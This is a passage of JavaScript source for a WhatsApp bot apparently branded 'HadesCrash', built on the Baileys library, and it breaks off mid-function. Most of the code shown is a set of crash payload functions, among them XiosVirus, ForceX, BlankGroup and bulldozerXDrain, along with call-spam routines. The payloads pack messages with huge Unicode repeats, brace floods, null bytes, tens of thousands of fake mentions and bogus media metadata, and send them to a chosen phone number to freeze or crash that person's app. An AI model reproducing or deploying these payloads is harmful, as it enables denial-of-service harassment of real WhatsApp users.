/*
minimal kasih credit ©argaOfficial
*/


require('./settings');
const fs = require('fs');
const { modul } = require('./module')
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const tdxlol = fs.readFileSync('./logo.jpg');
const crypto = require('crypto');
const chalk = require("chalk");
const util = require("util");
const { Client } = require('ssh2');
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');
const JsConfuser = require('js-confuser');
const { spawn, exec, execSync } = require('child_process');

const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = arga = async (arga, m, chatUpdate, store) => {
try {
// Message type handlers
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? arga.user.id.split(":")[0] || arga.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/';

// Buat Grup
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database And Lain"
const botNumber = await arga.decodeJid(arga.user.id);
const isBot = botNumber.includes(senderNumber)
const ownerbot = JSON.parse(fs.readFileSync("./lib/Database/owner.json"))
const isOwner = ownerbot.includes(sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const isPc = from.endsWith('@s.whatsapp.net')

// function Group
const groupMetadata = isGroup ? await arga.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')


        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
       

// My Func
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
formatp,
getTime,
getRandom,
sleep } = require('./lib/myfunc');

// fungsi waktu real time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

const DaffaDevStickSc = () => {
        let DaffaDevStikRep = fs.readFileSync('./sticker-reply-sc/sc.webp')
        arga.sendMessage(from, { sticker: DaffaDevStikRep }, { quoted: m })
        }  

const replybar = (teks) => {
    arga.sendMessage(m.chat, { 
        text: teks,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: global.title,
                previewType: "PHOTO",
                thumbnailUrl: global.image.Reply,
                thumbnail: ``,
                sourceUrl: global.website
            }
        }
    }, { quoted: m });
}      


// Cmd in Console
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`➤ New Messages`));
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Tanggal: ${new Date().toLocaleString()} \n` +
` ├─ > Pesan: ${m.body || m.mtype} \n` +
` ├─ > Pengirim: ${m.pushname} \n` +
` ╰─ > JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Grup: ${groupName} \n` +
` ╰─ > GroupJid: ${m.chat}`
)
);
}
console.log();
}

//==========================================//
const { os, baileys, child_process, crypto, cookie,  fetch, process, ms, speed, syntaxerror, nodecron } = modul
//==========================================//

//==========================================//   
const userSessions = {};
//==========================================//

// AKHIR FUNC BUG //
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}}

async function edit2 (tex1, tex2) {
var nln = [
`${tex1}`,
`${tex2}`
]
let { key } = await arga.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await arga.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function edit3 (tex1, tex2, tex3) {
var nln = [
`${tex1}`,
`${tex2}`,
`${tex3}`
]
let { key } = await arga.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await arga.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}  

async function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
//==========================================//

// Done Ress //
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = ` 𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴𝘀!!
💬 *_${command}_* Sent To : 
📱 ${pepec}

 𝗣𝗹𝗲𝗮𝘀𝗲 𝗣𝗮𝘂𝘀𝗲 𝟭𝟱 𝗠𝗶𝗻𝘂𝘁𝗲𝘀 𝗢𝗿 𝗗𝗲𝗹𝗲𝘁𝗲 𝗔𝗰𝗰𝗲𝘀𝘀 ❕`

  let buttons = [
        { buttonId: ".tqto", buttonText: { displayText: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼" } }
    ];

    let buttonMessage = {
        image: thumb, 
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "",
                newsletterName: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀"
            }
        },
        footer: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await arga.sendMessage(m.chat, buttonMessage, { quoted: m });
}

// Random Emoji //       
const Moji1 = '🌸'
const Moji2 = '🍁'
const Moji3 = '🍃'
const ERandom = [Moji1, Moji2, Moji3]
let Feature = Math.floor(Math.random() * ERandom.length)
const emoji = ERandom[Feature]

        // Thumb Bot //

const thumb = fs.readFileSync('./logo.jpg');

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('hadesvcx.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `💫 Hallo User, Apakan Anda Sedang Mencari ${prefix+mean}?\n💫 Nama Menu : ${prefix+mean}`
arga.sendMessage(m.chat, { image: thumb, caption: response }, {quoted: m})
}}

const sound = { 
key: {
fromMe: false, 
participant: `6285141324992@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 9999999999999,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

async function quickreply1(chat, teks, quick1, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "120363390274692764@newsletter",
newsletterName: `ᴄʜᴀɴɴᴇʟ ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: arga.decodeJid(arga.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `ʙʏ ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": quick1
}
],
})})
}}
}, { quoted: jm }) //ori (floc)

await arga.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
const ftoko = {
      key: {
        fromMe: false,
        participant: `6285141324992@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        productMessage: {
          product: {
            title: `𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀`,
            description: `${pushname} order`,
            currencyCode: "IDR",
            priceAmount1000: "999999999999",
            retailerId: `⏤͟͟͞͞arga Official`,
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
const hw = {
  key: {
    participant: '6285141324992@s.whatsapp.net', 
    ...(m.chat ? {remoteJid: `status@broadcast`} : {})
  }, 
  message: {
    liveLocationMessage: {
      caption: `₳ɽ₲₳ Ł₴ⱨ ₩ł₦`,
      jpegThumbnail: ""
    }
  }, 
quoted: sound
} 

    const isCreator = JSON.parse(fs.readFileSync('./lib/Database/owner.json'));

    const isAccargaDev = [botNumber, ...isCreator, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);

const argaReply = (teks) => {
arga.sendMessage(m.chat, {
  image: { url: `https://files.catbox.moe/k14raw.jpg` }, //gif nya
        caption: teks,
        footer: " ",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀`,
                body: `⏤͟͟͞͞arga Official`,
                thumbnailUrl: `https://files.catbox.moe/k14raw.jpg`,
                sourceUrl: `https://xnxx.com`,
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
  {
   buttonId: ".menu", 
    buttonText: { 
      displayText: '⍣𝐁𝐚͠𝐜͜𝐤 𝐌͠𝐞͜𝐧͠𝐮⍣' 
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: hw })
}

const reaction = async (jidss, emoji) => {
arga.sendMessage(jidss, { react: { text: emoji, key: m.key }})}





async function QDIphone(target, QBug) {
      arga.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }


   
    async function XiosVirus(target, QBug) {
      arga.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀 :>-` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "\u0000" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
    
async function ForceX(target) {
let Payload = generateWAMessageFromContent(target, proto.Message.fromObject({
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
title: "꙳͙͡༑ᐧزهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
locationMessage: {
degreesLatitude: -999.03499999999999,
degreesLongitude: 922.999999999999,
name: "𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
address: "زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
jpegThumbnail: null
},
hasMediaAttachment: false
},
body: {
text: "꙳͙͡༑ᐧ ̬..زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي  :: 𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂زهروز ريي   𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂 :: >𐌃𐌀𐌐𐌉𐌐 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [],
},
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "QYxh+KzzJ0PayloadFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
fileName: "ZynXzo New",
fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
mediaKeyTimestamp: "1726867151",
jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z"
},
hasMediaAttachment: true
}
}
}
}), {
userJid: target,
quoted: null
});

await arga.relayMessage('status@broadcast', Payload.message, {
messageId: Payload.key.id,
statusJidList: [target],
additionalNodes: [{
tag: 'meta',
attrs: {},
content: [{
tag: 'mentioned_users',
attrs: {},
content: [{
tag: 'to',
attrs: {
jid: target
},
content: undefined
}]
}]
}]
});
};


async function invicXblank(target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀 :>" + "ោ៝".repeat(10000),
      caption: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀 :>" + "ោ៝".repeat(10000),
      jpegThumbnail: null
    }
  };
  await arga.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}


async function BlankGroup(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝐇͠𝐚͢𝐝͠𝐞͢𝐬⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🚀 :>" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await arga.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

async function sendOfferCall(isTarget) {
try {
await arga.offerCall(isTarget);
console.log(chalk.white.bold(`Success Send Offer Call To Target`));
} catch (error) {
console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
}
}
async function sendOfferVideoCall(isTarget) {
try {
await arga.offerCall(isTarget, { 
video: true 
});
console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
} catch (error) {
console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
}
}

async function protocolbug2(isTarget, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "hadescrash Nihdekk🎭" + "{".repest(10000), 
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await depayy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await depayy.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function bulldozerXDrain(target) {
  const mentioned = [
    "0@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () => `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`)
  ];

  const msgPayload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 999999999, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Date.now(), high: 0, unsigned: true },
          firstFrameLength: 9999999,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            mentionedJid: mentioned,
            quotedMessage: {
              conversation: ""
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "ArgaOffc "+ " \u2003".repeat(3000) + " {".repeat(2000) ,
              body: "",
              mediaType: 1,
              thumbnailUrl: "https://telegra.ph/file/0dc4ab9c226a3b.png",
              mediaUrl: "https://wa.me/0",
              sourceUrl: "https://wa.me/0"
            }
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false }
        }
      }
    }
  };

  
  const msg = generateWAMessageFromContent("status@broadcast", msgPayload, {});
  await arga.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

 
  await arga.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          type: 25
        }
      }
    }
  }, {
    additionalNodes: [
      {
        tag: "meta",
        attrs: { is_status_mention: "ArgaOffc " },
        content: undefined
      }
    ]
  });

  console.log(chalk.redBright(`[BULLDOZER] (${target}) ATTACKING`));
}

async function ForceSpamSafe(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: {
            text: ' 🩸저스틴공𝗔𝗿𝗴𝗮𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹🔥🩸저스틴공𝗔𝗿𝗴𝗮𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹🔥 🩸 ' + " \u2003".repeat(30000) + " ꦾ".repeat(2000)
          },
          footer: {
